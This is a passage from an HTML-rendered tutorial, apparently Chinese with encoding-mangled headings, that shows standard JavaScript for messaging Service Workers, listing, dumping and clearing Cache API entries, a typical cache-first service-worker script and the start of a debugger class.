<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW State]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">state</span><span class="p">);</span>
<span class="w">                </span><span class="p">});</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">registration</span><span class="p">;</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h4 id="3-ç›‘å¬-service-worker-æ¶ˆæ¯">3. <strong>ç›‘å¬ Service Worker æ¶ˆæ¯</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å‘é€æ¶ˆæ¯åˆ° Service Worker</span>
<span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">controller</span><span class="o">?</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span>
<span class="w">    </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;GET_CACHE_INFO&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span>
<span class="p">});</span>

<span class="c1">// æ¥æ”¶æ¥è‡ª Service Worker çš„æ¶ˆæ¯</span>
<span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Message from Service Worker:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="ç¼“å­˜åˆ†æ">ç¼“å­˜åˆ†æ</h3>

      <h4 id="1-æšä¸¾æ‰€æœ‰ç¼“å­˜">1. <strong>æšä¸¾æ‰€æœ‰ç¼“å­˜</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">listAllCaches</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="s1">&#39;caches&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nb">window</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Cache API not supported&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cacheNames</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="nx">keys</span><span class="p">();</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Found caches:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">cacheNames</span><span class="p">);</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">cacheName</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">cacheNames</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`\n=== Cache: </span><span class="si">${</span><span class="nx">cacheName</span><span class="si">}</span><span class="sb"> ===`</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">cacheName</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">keys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">cache</span><span class="p">.</span><span class="nx">keys</span><span class="p">();</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Total entries: </span><span class="si">${</span><span class="nx">keys</span><span class="p">.</span><span class="nx">length</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="nx">keys</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  </span><span class="si">${</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="si">}</span><span class="sb">. </span><span class="si">${</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">listAllCaches</span><span class="p">();</span>
</code></pre>
      </div>

      <h4 id="2-è¯»å–ç¼“å­˜å†…å®¹">2. <strong>è¯»å–ç¼“å­˜å†…å®¹</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">dumpCacheContent</span><span class="p">(</span><span class="nx">cacheName</span><span class="p">,</span><span class="w"> </span><span class="nx">urlPattern</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">cacheName</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">keys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">cache</span><span class="p">.</span><span class="nx">keys</span><span class="p">();</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">keys</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">urlPattern</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">urlPattern</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">cache</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
<span class="w">            </span><span class="nx">response</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">headers</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">            </span><span class="p">});</span>

<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;URL:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Status:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Headers:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">headers</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// æ ¹æ®å†…å®¹ç±»å‹è¯»å–å“åº”ä½“</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">contentType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;content-type&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">contentType</span><span class="o">?</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;json&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">().</span><span class="nx">json</span><span class="p">();</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;JSON:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">json</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">contentType</span><span class="o">?</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">contentType</span><span class="o">?</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;javascript&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">().</span><span class="nx">text</span><span class="p">();</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Text:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">500</span><span class="p">));</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">blob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">().</span><span class="nx">blob</span><span class="p">();</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Blob size:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">blob</span><span class="p">.</span><span class="nx">size</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;bytes&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;---&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="nx">dumpCacheContent</span><span class="p">(</span><span class="s1">&#39;my-cache-v1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;api&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h4 id="3-æ¸…é™¤ç‰¹å®šç¼“å­˜">3. <strong>æ¸…é™¤ç‰¹å®šç¼“å­˜</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">clearCache</span><span class="p">(</span><span class="nx">cacheName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">deleted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="ow">delete</span><span class="p">(</span><span class="nx">cacheName</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Cache &quot;</span><span class="si">${</span><span class="nx">cacheName</span><span class="si">}</span><span class="sb">&quot; deleted:`</span><span class="p">,</span><span class="w"> </span><span class="nx">deleted</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">clearAllCaches</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cacheNames</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="nx">keys</span><span class="p">();</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">cacheNames</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">name</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="ow">delete</span><span class="p">(</span><span class="nx">name</span><span class="p">)));</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;All caches cleared&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="service-worker-å†…éƒ¨ä»£ç ç¤ºä¾‹">Service Worker å†…éƒ¨ä»£ç ç¤ºä¾‹</h3>

      <h4 id="å…¸å‹çš„-service-worker-ç»“æ„">å…¸å‹çš„ Service Worker ç»“æ„</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// service-worker.js</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">CACHE_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;my-app-v1&#39;</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">urlsToCache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="s1">&#39;/&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="s1">&#39;/styles/main.css&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="s1">&#39;/scripts/app.js&#39;</span>
<span class="p">];</span>

<span class="c1">// å®‰è£…äº‹ä»¶ - ç¼“å­˜èµ„æº</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;install&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW] Installing...&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">waitUntil</span><span class="p">(</span>
<span class="w">        </span><span class="nx">caches</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">CACHE_NAME</span><span class="p">)</span>
<span class="w">            </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">cache</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW] Caching app shell&#39;</span><span class="p">);</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">cache</span><span class="p">.</span><span class="nx">addAll</span><span class="p">(</span><span class="nx">urlsToCache</span><span class="p">);</span>
<span class="w">            </span><span class="p">})</span>
<span class="w">            </span><span class="p">.</span><span class="nx">then</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">self</span><span class="p">.</span><span class="nx">skipWaiting</span><span class="p">())</span><span class="w"> </span><span class="c1">// ç«‹å³æ¿€æ´»</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">});</span>

<span class="c1">// æ¿€æ´»äº‹ä»¶ - æ¸…ç†æ—§ç¼“å­˜</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;activate&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW] Activating...&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">waitUntil</span><span class="p">(</span>
<span class="w">        </span><span class="nx">caches</span><span class="p">.</span><span class="nx">keys</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">cacheNames</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span>
<span class="w">                </span><span class="nx">cacheNames</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">cacheName</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">cacheName</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="nx">CACHE_NAME</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW] Deleting old cache:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">cacheName</span><span class="p">);</span>
<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="ow">delete</span><span class="p">(</span><span class="nx">cacheName</span><span class="p">);</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">})</span>
<span class="w">            </span><span class="p">);</span>
<span class="w">        </span><span class="p">}).</span><span class="nx">then</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">self</span><span class="p">.</span><span class="nx">clients</span><span class="p">.</span><span class="nx">claim</span><span class="p">())</span><span class="w"> </span><span class="c1">// ç«‹å³æ§åˆ¶é¡µé¢</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">});</span>

<span class="c1">// Fetch äº‹ä»¶ - ç½‘ç»œè¯·æ±‚æ‹¦æˆª</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW] Fetching:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>

<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span>
<span class="w">        </span><span class="c1">// ç¼“å­˜ä¼˜å…ˆç­–ç•¥</span>
<span class="w">        </span><span class="nx">caches</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">)</span>
<span class="w">            </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW] Cache hit:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>

<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW] Cache miss, fetching:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="c1">// ç¼“å­˜æ–°å“åº”</span>
<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="kd">const</span><span class="w"> </span><span class="nx">responseClone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
<span class="w">                        </span><span class="nx">caches</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">CACHE_NAME</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">cache</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                            </span><span class="nx">cache</span><span class="p">.</span><span class="nx">put</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">responseClone</span><span class="p">);</span>
<span class="w">                        </span><span class="p">});</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">                </span><span class="p">});</span>
<span class="w">            </span><span class="p">})</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">});</span>

<span class="c1">// æ¶ˆæ¯å¤„ç†</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW] Message received:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">type</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;SKIP_WAITING&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">self</span><span class="p">.</span><span class="nx">skipWaiting</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// å›å¤æ¶ˆæ¯</span>
<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">ports</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">postMessage</span><span class="p">({</span>
<span class="w">        </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;PONG&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®æˆ˜ç¤ºä¾‹">å®æˆ˜ç¤ºä¾‹</h2>

      <h3 id="ç¤ºä¾‹1-service-worker-è°ƒè¯•å·¥å…·">ç¤ºä¾‹1: Service Worker è°ƒè¯•å·¥å…·</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">ServiceWorkerDebugger</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">registrations</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="s1">&#39;serviceWorker&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">navigator</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Service Worker not supported&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">registrations</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">getRegistrations</span><span class="p">();</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">setupListeners</span><span class="p">();</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">analyze</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">setupListeners</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// ç›‘å¬æ–°çš„ Service Worker</span>
<span class="w">        </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;controllerchange&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Debugger] Controller changed&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">analyze</span><span class="p">();</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// ç›‘å¬æ¶ˆæ¯</span>
<span class="w">        </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Debugger] Message:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">analyze</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;=== Service Worker Analysis ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Found </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">registrations</span><span class="p">.</span><span class="nx">length</span><span class="si">}</span><span class="sb"> registration(s)`</span><span class="p">);</span>

